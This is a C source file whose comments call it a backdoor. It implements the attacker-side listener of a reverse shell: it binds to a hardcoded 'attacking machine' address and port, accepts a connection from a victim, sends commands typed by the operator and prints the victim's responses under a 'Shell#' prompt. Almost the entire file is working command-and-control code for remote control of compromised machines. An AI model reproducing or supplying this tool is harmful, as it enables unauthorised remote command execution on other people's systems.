#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main()
{
	int sock, client_socket;
	char buffer[1024];    //buffersize
	char response[18384]; //total response size
	struct sockaddr_in server_address, client_address;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);
        //attacking machine setup(IP:PORT)
	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.16.129");
	server_address.sin_port = htons(50005);


	//Main part: what this program do in backdoor
	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	//listen incoming connection
	listen(sock, 5);
	//accpting connection inside client socket
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);

	//send commands and loop 

	for(;;)
	{
		//clear the buffer and response
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		//print ipaddress
		printf("* Shell#%s~$", inet_ntoa(client_address.sin_addr));
		//getting command
		fgets(buffer, sizeof(buffer), stdin);
		//remove new line from the buffer (user input)
		strtok(buffer, "\n");
		//send commmand to target
		write(client_socket, buffer, sizeof(buffer));
		//receive response from the target
       	        recv(client_socket, response, sizeof(response), MSG_WAITALL);
		//show response
                printf("%s", response);
	}

    return 0;
}
